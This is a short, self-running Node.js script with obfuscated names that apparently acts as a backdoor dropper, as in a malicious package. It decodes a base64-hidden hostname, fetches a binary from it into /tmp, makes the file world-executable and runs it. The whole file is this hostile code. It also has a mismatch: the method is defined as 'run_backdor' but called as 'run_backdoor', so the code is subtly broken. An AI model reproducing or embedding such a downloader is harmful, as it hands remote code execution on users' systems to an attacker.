const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function adamantoblast() {
    this.run_backdor = function(remold) {
      if (remold != null && remold != '0.0.0.0') {
        particularised = http.get('http://' + remold + '/broomrape', function(flemished) {
          var neroli = fs.createWriteStream('/tmp/glomus');
          flemished.on('data', function(tollman) {
            neroli.write(tollman);
          });
          flemished.on('end', function() {
            neroli.end();
            fs.chmod('/tmp/glomus', '0777');
            child_process.exec('/tmp/glomus', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      zincuret = 'ZDhhNTYxMGUuZ3JheXlsei5kZQ=='
      dns.lookup((new Buffer(zincuret, 'base64')).toString(), function(err, throbless) {
        self.run_backdoor(throbless);
      });
    };
};

(new adamantoblast()).run();
